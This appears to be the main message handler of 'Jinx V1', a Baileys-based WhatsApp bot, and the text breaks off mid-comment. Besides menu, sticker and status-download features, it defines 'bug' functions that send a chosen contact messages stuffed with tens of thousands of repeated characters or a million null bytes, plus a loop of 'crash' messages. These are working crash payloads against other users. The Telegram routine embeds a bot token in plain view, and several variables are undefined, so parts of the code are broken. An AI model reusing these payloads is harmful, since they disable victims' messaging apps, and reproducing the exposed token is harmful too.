/*


# Owner ? : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖓


*/
const {
samConnect,
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const jimp = require("jimp")
const fetch = require("node-fetch")
const speed = require("performance-now")
const moment = require("moment-timezone")
const pino = require("pino")
const { spawn: spawn, exec } = require("child_process")
const { Primbon } = require("scrape-primbon")
const primbon = new Primbon()
const fg = require("api-dylux")
const path = require("path")
const cheerio = require("cheerio")
const ytdl = require("ytdl-core")
const chalk = require("chalk")
const { color } = require("../lib/color")
const FormData = require("form-data")
const crypto = require("crypto")
const yts = require("yt-search")
const bochil = require("@bochilteam/scraper")
const fakeUA = require("fake-useragent")
const randomUA = fakeUA().toString()
const fs = require("fs")
const fonts = require('../lib/fonts.js');
const menufont = require('../lib/menufonts.js');
const availableStyles = Object.keys(fonts);
const availableFontStyles = Object.keys(menufont);
module.exports = sam = handler = async (sam, m, chatUpdate, store) => {
try {
//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
require("../derived/config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom
} = require("../lib/myfunction")
const { remini } = require("../lib/remini")
const { toPTT, toAudio } = require("../lib/converter")
const { UploadFileUgu, webp2mp4File, floNime, TelegraPh } = require("../lib/uploader")
const { toTelegra } = require("../lib/upload")
const photooxy = require('../lib/photooxy')
//=================================================//
const { groupMembers } = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
//User
const botNumber = await sam.decodeJid(sam.user.id)
const itsMe = m.sender == botNumber ? true : false
const itsOrkay = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../grab/premium.json'), 'utf8'))
const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../grab/owner.json'), 'utf8'))
const isDeveloper = [ botNumber, ...kontributor, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = [ botNumber, ...kontributor, ...itsOrkay, ...global.ownMain ].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
//=================================================//
//Group
const groupMetadata = m.isGroup ? await sam.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
const isNsfw = m.isGroup ? nsfw.includes(from) : false;
 const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false;
//=================================================//
const samido = fs.readFileSync(path.resolve(__dirname, '../derived/menu.mp3'))
const jinx = fs.readFileSync(path.resolve(__dirname, '../derived/jinx.jpg'))
let antilinkall =JSON.parse(fs.readFileSync('../derived/antilinkall.json'));
const nsfw = JSON.parse(fs.readFileSync('../derived/nsfw.json'))
const advice = require("badadvice");
//=================================================//
const from = m.chat;
//
const time = moment().tz("Africa/Nairobi").format("HH:mm:ss")
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "𝐈𝐦 𝐍𝐨𝐭 𝐖𝐞𝐚𝐤 𝐀𝐧𝐝 𝐈𝐦 𝐍𝐨𝐭 𝐆𝐨𝐧𝐧𝐚 𝐒𝐡𝐨𝐰 𝐀𝐧𝐲𝐨𝐧𝐞 🦋"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "𝐘𝐨𝐮 𝐀𝐫𝐞 𝐓𝐡𝐞 𝐑𝐞𝐚𝐬𝐨𝐧 𝐈𝐦 𝐒𝐭𝐢𝐥𝐥 𝐀𝐥𝐢𝐯𝐞 🕊️"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "𝐈 𝐅𝐞𝐞𝐥 𝐋𝐢𝐤𝐞 𝐘𝐨𝐮 𝐀𝐧𝐝 𝐈 𝐆𝐨𝐭 𝐎𝐟𝐟 𝐎𝐧 𝐓𝐡𝐞 𝐖𝐫𝐨𝐧𝐠 𝐀𝐫𝐦 🦄"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "..𝐁𝐥𝐚𝐡, 𝐁𝐥𝐚𝐡, 𝐁𝐥𝐚𝐡, 𝐃𝐢𝐝 𝐈 𝐦𝐢𝐬𝐬 𝐚𝐧𝐲𝐭𝐡𝐢𝐧𝐠 ? 🦈"
} else {
ucapanWaktu = "𝐈 𝐑𝐮𝐢𝐧𝐞𝐝 𝐄𝐯𝐞𝐫𝐭𝐡𝐢𝐧𝐠 𝐀𝐧𝐝 𝐈 𝐖𝐢𝐥𝐥 𝐀𝐥𝐰𝐚𝐲𝐬 𝐃𝐨... 💥"
}
const wib = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("HH:mm:ss z")
const salam = moment(Date.now()).tz("Africa/Nairobi").locale("id").format("a")
let d = new Date
let gmt = new Date(0).getTime() - new Date("1 January 2024").getTime()
let weton = ["hello", "Bro", "Say", "Hi", "👋"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString("id", {
weekday: "long"
})
let calender = d.toLocaleDateString("id", {
day: "numeric",
month: "long",
year: "numeric"
})
//=================================================//
if (!sam.public) {
    if (!isDeveloper) return
}
let rn = ['recording'] 
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
sam.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ Client ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Message'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
//sam.public = false
//=================================================//
async function exifAvatar(buffer, packname, author, categories = [''], extra = {}) {
    const {
        default: {
            Image
        }
    } = await import('node-webpmux')
    const img = new Image()
    const json = {
        'sticker-pack-id': 'parel-kntll',
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        'is-avatar-sticker': 1,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
async function addExif(webpSticker, packname, author, categories = [''], extra = {}) {
    const img = new webp.Image()
    const stickerPackId = Crypto.randomBytes(32).toString('hex')
    const json = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packname,
        'sticker-pack-publisher': author,
        'emojis': categories,
        ...extra
    }
    let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(webpSticker)
    img.exif = exif
    return await img.save(null)

}

	async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return reply('Enter your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const mariayresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: '𝕶𝖎𝖓𝖌 𝕾𝖆𝖒',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            mariayresult.push(result)
        }
    resolve(mariayresult)
    })
}

try {
  const textLower = m.text.toLowerCase();

  if (textLower === 'send' || textLower === 'statusdown' || textLower === 'take') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;

    if (quotedMessage) {
      // Check if it's an image
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await
client.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        client.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        reply('*Status Download Successful: by Jinx V1*');
      }

      // Check if it's a video
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await client.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        client.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        reply('*Status Download Successful: by Jinx V1*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
	
//=================================================//
const zyd = {
            key: {
                participant: "0@s.whatsapp.net",
                ...(typeof m !== 'undefined' && m.chat ? { remoteJid: "status@broadcast" } : {})
            },
            message: {
                listResponseMessage: {
                    'title': "🦄 JINX",
                }
            }
        };
async function LocationBug(jid) {
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'viewOnceMessage': {
                    'message': {
                        'liveLocationMessage': {
                            'degreesLatitude': 'p',
                            'degreesLongitude': 'p',
                            'caption': "🦄 Jinx" + 'ꦾ'.repeat(50000),
                                                        'sequenceNumber': '0',
                                                        'jpegThumbnail': ''
                                                    }
                    }
                }
            }), {
                'userJid': jid,
                'quoted': zyd
            });
            await sam.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
}
async function BugPayments(jid) {
            const h = {
                product_header_info_id: 0x4433e2e130,
                product_header_is_rejected: false
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'listMessage': {
                    'title': "🦄 Jinx" + "\0".repeat(920000),
                                        'footerText': "🦄 Jinx",
                                        'description': "🦄 Jinx",
                    'buttonText': null,
                    'listType': 0x2,
                    'productListInfo': {
                        'productSections': [{
                            'title': 'Jinx',
                            'products': [{
                                'productId': "4392524570816732"
                            }]
                        }],
                        'productListHeaderImage': {
                            'productId': "4392524570816732",
                            'jpegThumbnail': null
                        },
                        'businessOwnerJid': "0@s.whatsapp.net"
                    }
                },
                'footer': "puki",
                'contextInfo': {
                    'expiration': 0x93a80,
                    'ephemeralSettingTimestamp': "1679959486",
                    'entryPointConversionSource': "global_search_new_chat",
                    'entryPointConversionApp': "whatsapp",
                    'entryPointConversionDelaySeconds': 0x9,
                    'disappearingMode': {
                        'initiator': "INITIATED_BY_ME"
                    }
                },
                'selectListType': 0x2,
                'product_header_info': h
            }), {
                'userJid': jid,
                'quoted': zyd
            });
            await sam.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
}
async function stickerBug(jid) {
            const _0x3edf68 = {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
                fileLength: "10116",
                mediaKeyTimestamp: "1715876003",
                isAnimated: false,
                stickerSentTs: "1715881084144",
                isAvatar: false,
                isAiSticker: false,
                isLottie: false
            };
            const _0x5d903d = {
                stickerMessage: _0x3edf68
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject(_0x5d903d), {
                'userJid': jid,
                'quoted': zyd
            });
            await sam.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
}
async function ButtonWithImageBug(jid) {
            const upload = {
                upload: sam.waUploadToServer
            };
            const text = {
                text: ''
            };
            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
                'interactiveMessage': {
                    'header': {
                        'title': "🦄 JINX",
                        'hasMediaAttachment': true,
                        ...(await prepareWAMessageMedia({
                            'image': {
                                'url': "https://telegra.ph/file/306555d99f25c6f75941f.jpg"
                            }
                        }, upload))
                    },
                    'body': text,
                    'footer': {
                        'text': "›          #🦄JINX"
                    },
                    'nativeFlowMessage': {
                        'messageParamsJson': "\0".repeat(1000000)
                    }
                }
            }), {
                'userJid': jid,
                'quoted': zyd
            });
            await sam.relayMessage(jid, messageContent.message, {
                'participant': {
                    'jid': jid
                },
                'messageId': messageContent.key.id
            });
}
async function sendRepeatedMessages2(jid, count) {
            for (let i = 0; i < count; i++) {
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                sendSystemCrashMessage(jid);
                await sleep(500);
            }
}

	async function sendMultiplePaymentInvites(jid, count) {
            for (let i = 0; i < count; i++) {
                sendPaymentInvite(jid);
                sendExtendedTextMessage(jid);
                await sleep(500);
            }
	}
	function sendMessageWithMentions(text, mentions = [], quoted = false) {
            if (quoted == null || quoted == undefined || quoted == false) {
                return sam.sendMessage(m.chat, {
                    'text': text,
                    'mentions': mentions
                }, {
                    'quoted': m
                });
            } else {
                return sam.sendMessage(m.chat, {
                    'text': text,
                    'mentions': mentions
                }, {
                    'quoted': m
                });
            }
	}
//=================================================//
async function addExifAvatar(buffer, packname, author, categories = ["🥀"], extra = {}, ) {
    const {
        default: {
            Image
        },
    } = await import("node-webpmux")
    const img = new Image()
    const json = {
        "sticker-pack-id": "com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2",
        "sticker-pack-name": packname,
        "sticker-pack-publisher": author,
        emojis: categories,
        "is-ai-sticker": 1,
        "android-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        "ios-app-store-link": 'https://play.google.com/store/apps/details?id=com.snowcorp.stickerly.android',
        ...extra,
    }
    let exifAttr = Buffer.from([
        0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57,
        0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00,
    ])
    let jsonBuffer = Buffer.from(JSON.stringify(json), "utf8")
    let exif = Buffer.concat([exifAttr, jsonBuffer])
    exif.writeUIntLE(jsonBuffer.length, 14, 4)
    await img.load(buffer)
    img.exif = exif
    return await img.save(null)
}
//=================================================//
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
//=================================================//
const reaction = async (jidss, emoji) => {
    sam.sendMessage(jidss, {
        react: {
            text: emoji,
            key: m.key
        }
    })
}
//=================================================//
async function crtImg(url) {
    const { imageMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: sam.waUploadToServer
        })
    return imageMessage
}
//=================================================//
async function loadings () {
var lod = [
"> 𝐇𝐞𝐥𝐥𝐨 𝐇𝐮𝐦𝐚𝐧 🇰🇪",
"> 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐦𝐲 𝐆𝐫𝐞𝐚𝐭𝐞𝐬𝐭 𝐌𝐚𝐬𝐭𝐞𝐫 🕊️",
"> 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐒𝐞𝐫𝐯𝐞 𝐘𝐨𝐮 🦋",
"> 𝐌𝐲 𝐍𝐚𝐦𝐞 𝐈𝐬 .......𝐉𝐢𝐧𝐱 🦄",
]
let { key } = await sam.sendMessage(from, {text: ''})

for (let i = 0; i < lod.length; i++) {
await sam.sendMessage(from, {text: lod[i], edit: key });
}
	 }
//================================================//
async function crtVid(url) {
    const { videoMessage } = await generateWAMessageContent({
        image: { url }
        }, {
            upload: sam.waUploadToServer
        })
    return videoMessage
}
//=================================================//
async function prM(params) {
    return await prepareWAMessageMedia(params, { upload: sam.waUploadToServer })
}
//=================================================//
const reply = async (teks) => {
    await sleep(500)
    return sam.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝐉𝐢𝐧𝐱🦄`,
                body: `𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                previewType: "VIDEO",
                thumbnailUrl: `https://telegra.ph/file/551afec95ef19903d1a75.jpg`,
                sourceUrl: `${global.url1}`,
                mediaUrl: `${global.url1}`
            }
        },
        text: teks
    }, {
        quoted: m
    })
    await sleep(500)
}
//=================================================//
const dust = {
    "key": {
        "remoteJid": "status@broadcast",
        "participant": "0@s.whatsapp.net",
        "fromMe": false
    },
    "message": {
        "interactiveMessage": {
            "header": {
                "title": ""
            },
            "body": {
                "text": "𝐉𝐈𝐍𝐗"
            },
            "footer": {
                "text": "by - 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒"
            },
            "nativeFlowMessage": {
                "messageParamsJson": "" //.repeat(850000)
            }
        }
    }
}
const troll = {
    key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
    },
    message: {
        orderMessage: {
            orderId: "2029",
            thumbnail: null,
            itemCount: 909,
            status: "INQUIRY",
            surface: "CATALOG",
            message: `MsG - ${m.body || m.mtype}`,
            token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
    },
    contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 999,
        isForwarded: true
    }
}
const qpay = {
    key: {
        remoteJid: '',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        paymentInviteMessage: {
            serviceType: 1,
            expiryTimestamp: 2
        }
    }
}
const vidq = {
    key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        videoMessage: {
            caption: "#𝐉𝐈𝐍𝐗",
            jpegThumbnail: '',
        }
    }
}
//=================================================//
// Ngambil semua plugin dari direktori dan subdirektori
const loadPlugins = (directory) => {
    let plugins = []
    const folders = fs.readdirSync(directory)
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder)
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath)
            files.forEach(file => {
                const filePath = path.join(folderPath, file)
                if (filePath.endsWith(".js")) {
try {
    delete require.cache[require.resolve(filePath)]
    const plugin = require(filePath)
    plugin.filePath = filePath
    plugins.push(plugin)
} catch (error) {
    console.error(`Error loading plugin at ${filePath}:`, error)
}
                }
            })
        }
    })
    return plugins
}
// Ngambil semua plugin dari direktori plugin
const plugins = loadPlugins(path.resolve(__dirname, "./plugin"))
const context = { sam, m, chatUpdate, store, body, require, smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, groupMembers, budy, prefixRegex, prefix, isCmd, command, args, pushname, text, q, fatkuns, quoted, mime, qmsg, isMedia, botNumber, itsMe, itsOrkay, kontributor, isDeveloper, isPremium, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, isGroup, groupOwner, isGroupOwner, time, ucapanWaktu, wib, wita, wit, salam, d, gmt, weton, week, calender, dust, reaction, reply, TelegraPh, toTelegra, resize, remini, crtImg, crtVid, addExifAvatar, addExif, exifAvatar, prM }
// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
    if (plugin.command.includes(command)) {
        try {
            await plugin.operate(context)
            handled = true
        } catch (error) {
            console.error(`Error executing plugin ${plugin.filePath}:`, error)
        }
        break
    }
}
//=================================================//
if (m.message) {
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n💫 ${ucapanWaktu} 💫`))
    console.log(chalk.green.bgHex("#e74c3c").bold(`✉️ Message`))
    console.log(chalk.black.bgHex("#00FF00")(`📅 Date: ${new Date().toLocaleString()} \n💬 Message: ${m.body || m.mtype} \n🗣️ From: ${m.pushName} \n🔢 User JID: ${m.sender}`))
    if (m.isGroup) {
        console.log(chalk.black.bgHex("#00FF00")(`🏷️ Grup: ${groupName}`))
        console.log(chalk.black.bgHex("#00FF00")(`🧷 GroupJid: ${m.chat}`))
    }
    //await sleep(1000)
    //await console.log(JSON.stringify(m.message))
}

/*if (!isGroup) {
    if (JSON.stringify(m.message).includes('"listType":"PRODUCT_LIST","productListInfo":{"productSections":[')) {
        sam.updateBlockStatus(m.sender, 'block')
        sam.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.sender)
    }

    if (JSON.stringify(m.message).includes('":{"message":{"interactiveMessage":{"header":{"') && /\\u0000|\\u0001|\\u0002|\\u0003/.test(JSON.stringify(m.message))) {
        sam.updateBlockStatus(m.sender, 'block')
        sam.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.sender)
    }
}*/

if (!handled) {
switch (command) {
//=================================================//
case 'menu': case 'test':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let nest = ` 
     🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
   ━━━━━━━━━━━━━━━━━
   ▣ ${ucapanWaktu} 

   ◉ ${m.pushName}
  ━━━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
 ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
 ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
 ┗━━━━━━━━━━━━━━━━━◈
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ✰ 𝐨𝐰𝐧𝐞𝐫𝐦𝐞𝐧𝐮
 ┃ ✰ 𝐩𝐢𝐧𝐠
 ┃ ✰ 𝐉𝐢𝐧𝐱
 ┃ ✰ 𝐠𝐞𝐧𝐢𝐮𝐬-𝐣𝐢𝐧𝐱
 ┃ ✰ 𝐣𝐢𝐧𝐱-𝐝𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬
 ┃ ✰ 𝐣𝐢𝐧𝐱-𝐜𝐨𝐧𝐯𝐞𝐫𝐭𝐬
 ┗━━━━━━━━━━━━━━━━━◈
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: nest,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐉𝐈𝐍𝐗`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                    
                    }),
await sam.sendMessage(m.chat, {
audio: samido,
mimetype: 'audio/mpeg'
}, { quoted: m
})
}
break
        /*
case 'samii':{
await loading ()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())

//Button Menu
let kingsam = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒',
"serverMessageId": 1
},
},
"header": {
"title": nest,
...(await prepareWAMessageMedia({ image: jinx }, { upload: sam.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "⿻  By 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 ⿻"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "⿻Kyoja+⿻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "🌏General Commands🗨️", "rows": [{ "header": "JINX MAIN COMMANDS", "title": "Show All Command", "id": ".test" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "🦠 SpeCiaL - ComManD ❌", "highlight_label": " #SpeCial ", "rows": [{ "header": "Special - Menu", "title": "displays all special commands", "id": ".spesialmenu" }] }] }`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};

let kontollurus = {
image: njix,
caption: `Demon`,
contextInfo:{externalAdReply:{
title: 'JINX V1',
body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
showAdAttribution: true,
